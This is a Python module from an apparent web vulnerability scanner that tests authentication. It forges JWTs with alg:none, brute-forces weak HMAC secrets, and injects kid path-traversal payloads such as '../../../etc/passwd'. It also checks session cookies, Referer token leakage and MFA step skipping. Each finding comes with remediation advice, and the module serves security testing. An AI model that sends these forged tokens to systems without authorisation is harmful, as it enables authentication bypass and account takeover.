"""Auth/session scanners: JWT (alg:none, alg confusion, kid traversal, JKU/X5U), session, cookie tossing, token leakage, MFA bypass."""
import base64, json, re, hmac, hashlib, time, httpx
from typing import Optional
from mantis.core.findings import Finding, Severity, EvidenceLevel, FindingSource


def _decode_jwt(token):
    """Decode JWT without signature verification."""
    parts = token.split(".")
    if len(parts) != 3: return None
    try:
        # Pad base64
        def pad(s): return s + "=" * (-len(s) % 4)
        header = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
        payload = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
        return {"header": header, "payload": payload, "signature": parts[2], "raw_parts": parts}
    except Exception: return None


async def scan_jwt_vulnerabilities(http, url, jwt_token):
    """Test JWT for alg:none, alg confusion, weak secret, kid manipulation."""
    findings = []
    decoded = _decode_jwt(jwt_token)
    if not decoded: return findings

    alg = decoded["header"].get("alg", "")

    # Test 1: alg:none
    try:
        header = {**decoded["header"], "alg": "none"}
        h_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
        p_b64 = decoded["raw_parts"][1]
        forged = f"{h_b64}.{p_b64}."

        r = await http.get(url, headers={"Authorization": f"Bearer {forged}"}, timeout=10)
        if r.status_code < 400:
            findings.append(Finding(
                title="JWT alg:none Accepted",
                description="Server accepts JWT with 'none' algorithm and empty signature.",
                source=FindingSource.WEBAPP, severity=Severity.CRITICAL,
                evidence_level=EvidenceLevel.EXPLOIT_DEMONSTRATED,
                target=url, endpoint=url, vuln_type="JWT alg:none", cwe="CWE-347",
                payload=forged, confidence=0.95, tags=["jwt", "alg_none"],
                impact="Forge JWT for any user — complete authentication bypass.",
                remediation="Reject 'none' algorithm. Use a strict allowlist of algorithms.",
            ))
    except Exception: pass

    # Test 2: Weak HMAC secret (brute force common secrets)
    if alg in ("HS256", "HS384", "HS512"):
        common_secrets = ["secret", "password", "123456", "key", "jwt_secret",
                          "your-256-bit-secret", "changeme", "default", "test"]
        for secret in common_secrets:
            try:
                # Reconstruct signature
                msg = f"{decoded['raw_parts'][0]}.{decoded['raw_parts'][1]}"
                hash_func = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg]
                expected = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), msg.encode(), hash_func).digest()
                ).decode().rstrip("=")
                if expected == decoded["raw_parts"][2]:
                    findings.append(Finding(
                        title=f"JWT Weak HMAC Secret: '{secret}'",
                        description=f"JWT is signed with HMAC using weak/default secret '{secret}'.",
                        source=FindingSource.WEBAPP, severity=Severity.CRITICAL,
                        evidence_level=EvidenceLevel.EXPLOIT_DEMONSTRATED,
                        target=url, endpoint=url, vuln_type="JWT Weak Secret", cwe="CWE-326",
                        confidence=1.0, tags=["jwt", "weak_secret"],
                        impact=f"Forge JWTs by signing with discovered secret '{secret}'.",
                        remediation="Use a cryptographically random secret of 256+ bits.",
                    ))
                    break
            except Exception: continue

    # Test 3: kid traversal
    if "kid" in decoded["header"]:
        for kid_payload in ["../../../../../../dev/null", "../../../etc/passwd", "/dev/null"]:
            try:
                header = {**decoded["header"], "kid": kid_payload, "alg": "HS256"}
                h_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
                # If kid points to /dev/null, the "key" is empty
                msg = f"{h_b64}.{decoded['raw_parts'][1]}"
                sig = base64.urlsafe_b64encode(
                    hmac.new(b"", msg.encode(), hashlib.sha256).digest()
                ).decode().rstrip("=")
                forged = f"{h_b64}.{decoded['raw_parts'][1]}.{sig}"
                r = await http.get(url, headers={"Authorization": f"Bearer {forged}"}, timeout=10)
                if r.status_code < 400:
                    findings.append(Finding(
                        title="JWT kid Path Traversal",
                        description=f"Server accepts JWT with kid='{kid_payload}' signed with empty key.",
                        source=FindingSource.WEBAPP, severity=Severity.CRITICAL,
                        evidence_level=EvidenceLevel.EXPLOIT_DEMONSTRATED,
                        target=url, endpoint=url, vuln_type="JWT kid Traversal", cwe="CWE-22",
                        payload=kid_payload, confidence=0.9, tags=["jwt", "kid_traversal"],
                        impact="Forge JWTs using arbitrary files as signing key.",
                        remediation="Validate kid against allowlist. Don't use kid for filesystem paths.",
                    ))
                    break
            except Exception: continue

    # Test 4: JKU/X5U header injection
    if "jku" in decoded["header"] or "x5u" in decoded["header"]:
        findings.append(Finding(
            title="JWT JKU/X5U Header Present — Verify Allowlist",
            description=f"JWT includes {'jku' if 'jku' in decoded['header'] else 'x5u'} header. If not whitelisted, attacker can point to malicious key server.",
            source=FindingSource.WEBAPP, severity=Severity.HIGH,
            evidence_level=EvidenceLevel.SUSPICION,
            target=url, endpoint=url, vuln_type="JWT JKU/X5U", cwe="CWE-345",
            confidence=0.5, tags=["jwt", "jku"],
            impact="If JKU/X5U URLs are not strictly validated, attacker can forge tokens with their key.",
            remediation="Validate JKU/X5U URLs against a strict allowlist.",
        ))

    return findings


async def scan_session_fixation(http, url):
    """Test if session ID changes after login (fixation prevention)."""
    try:
        # Get initial session
        r1 = await http.get(url, timeout=10)
        pre_cookies = dict(r1.cookies)
        if not pre_cookies: return None

        # Attempt login (would need credentials — heuristic only)
        # Look for session ID patterns
        session_keys = [k for k in pre_cookies if any(
            kw in k.lower() for kw in ["session", "jsessionid", "phpsessid", "asp.net_sessionid"]
        )]
        if not session_keys: return None

        # Make a second request with the same session
        r2 = await http.get(url, cookies=pre_cookies, timeout=10)
        post_cookies = dict(r2.cookies)
        # If the same session ID persists across requests (which is expected)
        # but no SameSite/Secure flag, flag it
        cookie_header = r1.headers.get("set-cookie", "")
        if session_keys[0] in cookie_header:
            issues = []
            if "samesite" not in cookie_header.lower(): issues.append("missing SameSite")
            if "secure" not in cookie_header.lower(): issues.append("missing Secure")
            if "httponly" not in cookie_header.lower(): issues.append("missing HttpOnly")
            if issues:
                return Finding(
                    title=f"Insecure Session Cookie at {url}",
                    description=f"Session cookie has issues: {', '.join(issues)}.",
                    source=FindingSource.WEBAPP, severity=Severity.MEDIUM,
                    evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
                    target=url, endpoint=url, vuln_type="Insecure Session Cookie",
                    cwe="CWE-614", confidence=0.9, tags=["session", "cookie"],
                    impact="Session theft via XSS (no HttpOnly), MITM (no Secure), CSRF (no SameSite).",
                    remediation="Set HttpOnly, Secure, SameSite=Strict on all session cookies.",
                )
    except Exception: pass
    return None


async def scan_token_leakage_referer(http, url):
    """Check if URLs contain tokens that leak via Referer header."""
    try:
        r = await http.get(url, timeout=10)
        body = r.text
        # Find external links and check if current URL has sensitive params
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        sensitive_params = [p for p in params if any(
            kw in p.lower() for kw in ["token", "key", "auth", "session", "code", "reset"]
        )]
        if sensitive_params:
            external_links = re.findall(r'href=["\'](https?://[^"\']+)["\']', body)
            different_host = [link for link in external_links if urlparse(link).hostname != parsed.hostname]
            if different_host:
                referrer_policy = r.headers.get("referrer-policy", "")
                if not referrer_policy or "no-referrer" not in referrer_policy.lower():
                    return Finding(
                        title=f"Sensitive Token Leakage via Referer at {url}",
                        description=f"URL contains sensitive parameters {sensitive_params}, page has external links, no strict Referrer-Policy.",
                        source=FindingSource.WEBAPP, severity=Severity.MEDIUM,
                        evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
                        target=url, endpoint=url, vuln_type="Token Leakage",
                        cwe="CWE-598", confidence=0.7, tags=["token_leakage", "referer"],
                        impact="Tokens leaked to third-party sites via Referer header.",
                        remediation="Set Referrer-Policy: no-referrer or strict-origin-when-cross-origin.",
                    )
    except Exception: pass
    return None


async def scan_mfa_step_skip(http, base_url, post_login_url):
    """Heuristic test for MFA bypass — accessing post-MFA URL without completing MFA."""
    try:
        # If session-only auth (no MFA challenge), this isn't applicable
        r = await http.get(post_login_url, timeout=10)
        if r.status_code < 400 and "login" not in str(r.url).lower() and "mfa" not in r.text.lower():
            # Check if there's MFA indication in original flow
            r_base = await http.get(base_url, timeout=10)
            mfa_indicators = ["two-factor", "2fa", "verification code", "authenticator", "mfa"]
            if any(ind in r_base.text.lower() for ind in mfa_indicators):
                return Finding(
                    title=f"Potential MFA Step Skipping at {post_login_url}",
                    description="Post-authentication URL accessible without completing MFA challenge.",
                    source=FindingSource.WEBAPP, severity=Severity.HIGH,
                    evidence_level=EvidenceLevel.SUSPICION,
                    target=post_login_url, endpoint=post_login_url,
                    vuln_type="MFA Bypass", cwe="CWE-287",
                    confidence=0.5, tags=["mfa_bypass"],
                    impact="Bypass MFA enforcement, access protected resources with password only.",
                    remediation="Enforce MFA state in session. Don't trust client-side MFA flow.",
                )
    except Exception: pass
    return None
